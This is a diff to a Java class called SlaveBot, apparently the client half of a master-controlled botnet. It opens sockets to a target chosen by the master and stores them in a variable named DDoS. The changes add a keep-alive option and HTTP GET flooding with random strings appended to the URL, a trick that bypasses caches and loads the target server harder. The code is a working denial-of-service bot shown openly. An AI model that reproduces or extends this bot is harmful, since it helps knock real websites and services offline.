@@ -14,17 +14,17 @@ public class SlaveBot
 		int port = 0;
 		String ip = null;
 		
-//------for connection done for the first time
+		//for connection done for the first time
 		if(args.length != 0)
 		{
-//----------input format example = "java SlaveBot -h localhost -p 9999"
+			//input format example = "java SlaveBot -h localhost -p 9999"
 			if (args.length == 4) 
 			{
 				ip = args[1];
 				port = Integer.parseInt(args[3]);
 			}
 			
-//----------input format example = "java SlaveBot -h localhost 9999"
+			//input format example = "java SlaveBot -h localhost 9999"
 			else if(args.length == 3)
 			{
 				ip = args[1];
@@ -40,23 +40,16 @@ public class SlaveBot
 				e.printStackTrace();
 			}
 		}
-		
-//------for connection done by the command line
+		//for connection done by the command line
 		while(true)
 		{
 			Scanner reader = new Scanner(System.in);
 			String line = reader.nextLine();
 			String[] dataArray = line.split("\\s+");
 			System.out.print("> ");
-//----------loop if no data is entered
+			//loop if no data is entered
 			if (line.equals("")) 
 			{
-				continue;
-			}
-//----------display ArrayList of Clients
-			else if (line.equalsIgnoreCase("connectedToRemoteHost")) 
-			{
-				System.out.println(connectedToRemoteHost);
 				continue;
 			}
 //----------exit function logic
@@ -65,13 +58,13 @@ public class SlaveBot
 				System.out.println("Program Terminated.");
 				System.exit(0);
 			}
-//----------input format example = -h localhost -p 9999
+			//input format example = -h localhost -p 9999
 			else if(dataArray.length == 4)
 			{
 				ip = dataArray[1];
 				port = Integer.parseInt(dataArray[3]);
 			}
-//----------input format example = -h localhost 9999
+			//input format example = -h localhost 9999
 			else if(dataArray.length == 3)
 			{
 				ip = dataArray[1];
@@ -80,8 +73,6 @@ public class SlaveBot
 //----------for random input format
 			else
 			{
-				System.out.println(dataArray);
-				System.out.println("in else");
 				continue;
 			}
 			try
@@ -95,7 +86,7 @@ public class SlaveBot
 		}
 	}
 //--connect------------------------------------------------------------------------------------------------------------------------------------
-	public HashMap<String, ArrayList<Socket>> connect(Socket selectedSlave, String targetIP, int targetPort) throws IOException
+	public HashMap<String, ArrayList<Socket>> connect(Socket selectedSlave, String targetIP, int targetPort, boolean keepAlive, String url) throws IOException
 	{
 		try
 		{
@@ -108,6 +99,24 @@ public class SlaveBot
 				socketListForMap.add(DDoS);
 				System.out.println("Client " + selectedSlave.getRemoteSocketAddress() + " connected to " + DDoS.getInetAddress() + " via " + DDoS.getPort());
 			}
+			// if keep alive is requested from the master
+			if (keepAlive) 
+			{
+				DDoS.setKeepAlive(true);
+				System.out.println("keepAlive function is also active for this connection.\n");
+			}
+			// if url functionality is provided by the master
+			if (url != "" && url != null) 
+			{
+				BufferedWriter bw = new BufferedWriter (new OutputStreamWriter(DDoS.getOutputStream()));
+				BufferedReader br = new BufferedReader (new InputStreamReader(DDoS.getInputStream()));
+				bw.write("GET " + url + getRandomString() + "HTTP/1.1\n\nHost: "+ targetIP);
+				bw.flush();
+				System.out.println(br.readLine() + " random string used " + url + getRandomString() + "\n");
+				bw.close();
+				br.close();
+			}
+			
 			
 			for (String key : slavetoRemote.keySet()) 
 			{
@@ -150,4 +159,17 @@ public class SlaveBot
 			e.printStackTrace();
 		}
 	}
-}
+//--getRandomString----------------------------------------------------------------------------------------------------------------------------
+	public String getRandomString()
+	{
+		char[] charStream = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
+		StringBuilder stringBuilder = new StringBuilder();
+		Random random = new Random();
+		for (int i = 0; i < 20; i++) {
+		    char c = charStream[random.nextInt(charStream.length)];
+		    stringBuilder.append(c);
+		}
+		String randomString = stringBuilder.toString();
+		return randomString;
+	}
+}	
